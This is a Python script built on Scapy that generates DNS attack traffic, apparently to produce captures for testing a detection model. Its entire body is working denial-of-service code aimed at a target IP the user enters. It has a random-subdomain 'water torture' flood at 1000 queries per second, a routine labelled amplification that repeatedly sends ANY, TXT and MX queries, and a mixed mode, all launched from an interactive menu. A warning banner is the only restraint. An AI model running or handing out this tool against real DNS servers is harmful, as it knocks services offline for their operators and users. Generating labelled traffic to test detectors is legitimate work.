"""
DNS Attack Traffic Generator
Generates various types of DNS attacks for model testing
WARNING: Only use on networks you own or have permission to test!
"""

from scapy.all import *
import random
import time
import sys
import string

class DNSAttackGenerator:
    def __init__(self, target_dns):
        self.target_dns = target_dns
        self.queries_sent = 0
        
    def random_subdomain(self, length=10):
        """Generate random subdomain for water torture attack"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def dns_flood(self, duration=30, rate=1000):
        """
        DNS Query Flood (Water Torture Attack)
        Sends many queries for random non-existent subdomains
        """
        print("\n" + "=" * 60)
        print("ATTACK TYPE: DNS QUERY FLOOD (Water Torture)")
        print("=" * 60)
        print(f"Target DNS: {self.target_dns}")
        print(f"Rate: {rate} QPS")
        print(f"Duration: {duration} seconds")
        print(f"Expected queries: ~{rate * duration}")
        print("\nPress Ctrl+C to stop...")
        print("=" * 60)
        
        start_time = time.time()
        self.queries_sent = 0
        interval = 1.0 / rate  # Time between packets
        next_send = time.time()
        
        try:
            while time.time() - start_time < duration:
                # Generate random subdomain (water torture pattern)
                subdomain = self.random_subdomain(random.randint(8, 20))
                domain = f"{subdomain}.nonexistent-test-domain.com"
                
                # Create DNS query packet - use numeric qtype (1 = A record)
                pkt = IP(dst=self.target_dns) / UDP(dport=53) / DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype=1)
                )
                
                send(pkt, verbose=0)
                self.queries_sent += 1
                
                if self.queries_sent % 1000 == 0:
                    elapsed = time.time() - start_time
                    actual_rate = self.queries_sent / elapsed if elapsed > 0 else 0
                    print(f"[{elapsed:.1f}s] Sent: {self.queries_sent}, Rate: {actual_rate:.0f} QPS")
                
                # Precise rate control
                next_send += interval
                sleep_time = next_send - time.time()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
        except KeyboardInterrupt:
            print("\n\n[STOPPED] User interrupted")
        
        self._print_summary(start_time)
    
    def dns_amplification(self, duration=30, rate=100):
        """
        DNS Amplification Attack
        Sends queries for large responses (ANY, TXT records)
        """
        print("\n" + "=" * 60)
        print("ATTACK TYPE: DNS AMPLIFICATION")
        print("=" * 60)
        print(f"Target DNS: {self.target_dns}")
        print(f"Rate: {rate} QPS")
        print(f"Duration: {duration} seconds")
        print(f"Query types: ANY (255), TXT (16), MX (15) - large responses")
        print("\nPress Ctrl+C to stop...")
        print("=" * 60)
        
        # Domains with large DNS responses
        amp_domains = [
            'google.com',
            'facebook.com',
            'microsoft.com',
            'amazon.com',
            'cloudflare.com'
        ]
        
        start_time = time.time()
        self.queries_sent = 0
        interval = 1.0 / rate
        next_send = time.time()
        
        try:
            while time.time() - start_time < duration:
                domain = random.choice(amp_domains)
                # Use numeric query types: 255=ANY, 16=TXT, 15=MX
                qtype = random.choice([255, 16, 15])
                
                # Create amplification query
                pkt = IP(dst=self.target_dns) / UDP(dport=53) / DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype=qtype)
                )
                
                send(pkt, verbose=0)
                self.queries_sent += 1
                
                if self.queries_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    actual_rate = self.queries_sent / elapsed if elapsed > 0 else 0
                    print(f"[{elapsed:.1f}s] Sent: {self.queries_sent}, Rate: {actual_rate:.0f} QPS")
                
                # Precise rate control
                next_send += interval
                sleep_time = next_send - time.time()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
        except KeyboardInterrupt:
            print("\n\n[STOPPED] User interrupted")
        
        self._print_summary(start_time)
    
    def mixed_attack(self, duration=30, rate=500):
        """
        Mixed DNS attack (flood + amplification)
        """
        print("\n" + "=" * 60)
        print("ATTACK TYPE: MIXED (Flood + Amplification)")
        print("=" * 60)
        print(f"Target DNS: {self.target_dns}")
        print(f"Rate: {rate} QPS")
        print(f"Duration: {duration} seconds")
        print("\nPress Ctrl+C to stop...")
        print("=" * 60)
        
        amp_domains = ['google.com', 'facebook.com', 'cloudflare.com']
        
        start_time = time.time()
        self.queries_sent = 0
        interval = 1.0 / rate
        next_send = time.time()
        
        try:
            while time.time() - start_time < duration:
                # 70% flood, 30% amplification
                if random.random() < 0.7:
                    # Flood attack - use numeric qtype (1 = A record)
                    subdomain = self.random_subdomain(random.randint(8, 15))
                    domain = f"{subdomain}.attack-test.com"
                    qtype = 1
                else:
                    # Amplification - use numeric qtypes (255=ANY, 16=TXT)
                    domain = random.choice(amp_domains)
                    qtype = random.choice([255, 16])
                
                pkt = IP(dst=self.target_dns) / UDP(dport=53) / DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype=qtype)
                )
                
                send(pkt, verbose=0)
                self.queries_sent += 1
                
                if self.queries_sent % 500 == 0:
                    elapsed = time.time() - start_time
                    actual_rate = self.queries_sent / elapsed if elapsed > 0 else 0
                    print(f"[{elapsed:.1f}s] Sent: {self.queries_sent}, Rate: {actual_rate:.0f} QPS")
                
                # Precise rate control
                next_send += interval
                sleep_time = next_send - time.time()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
        except KeyboardInterrupt:
            print("\n\n[STOPPED] User interrupted")
        
        self._print_summary(start_time)
    
    def _print_summary(self, start_time):
        """Print attack summary"""
        elapsed = time.time() - start_time
        actual_rate = self.queries_sent / elapsed if elapsed > 0 else 0
        
        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)
        print(f"Total queries sent: {self.queries_sent}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Actual rate: {actual_rate:.2f} QPS")
        print("=" * 60)

def main():
    print("""
╔════════════════════════════════════════════════════════════╗
║          DNS ATTACK TRAFFIC GENERATOR                      ║
║                                                            ║
║  ⚠️  WARNING: Only use on networks you own/control! ⚠️    ║
║                                                            ║
║  Attack Types:                                            ║
║    1. DNS Flood (Water Torture) - 1000 QPS               ║
║    2. DNS Amplification - 100 QPS                        ║
║    3. Mixed Attack - 500 QPS                             ║
╚════════════════════════════════════════════════════════════╝
""")
    
    # Configuration
    TARGET_DNS = input("Enter target DNS IP (e.g., 192.168.1.1 or 127.0.0.1): ").strip()
    if not TARGET_DNS:
        TARGET_DNS = "127.0.0.1"
        print(f"Using default: {TARGET_DNS}")
    
    print("\nSelect attack type:")
    print("  1. DNS Flood (High volume, random subdomains)")
    print("  2. DNS Amplification (Large responses)")
    print("  3. Mixed Attack (Combination)")
    
    choice = input("\nChoice [1-3]: ").strip()
    
    duration = int(input("Duration in seconds [30]: ") or "30")
    
    print(f"\n⚠️  Starting attack in 3 seconds...")
    print("   Make sure your capture tool is running!")
    time.sleep(3)
    
    generator = DNSAttackGenerator(TARGET_DNS)
    
    if choice == '1':
        generator.dns_flood(duration=duration, rate=1000)
    elif choice == '2':
        generator.dns_amplification(duration=duration, rate=100)
    elif choice == '3':
        generator.mixed_attack(duration=duration, rate=500)
    else:
        print("Invalid choice")
        return
    
    print("\n✓ Attack simulation complete")
    print("  Stop your capture tool and test the model!")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[STOPPED] Exiting...")
    except Exception as e:
        print(f"\n[ERROR] {e}")
        print("\nNote: This script requires:")
        print("  1. Administrator/sudo privileges")
        print("  2. Scapy library: pip install scapy")
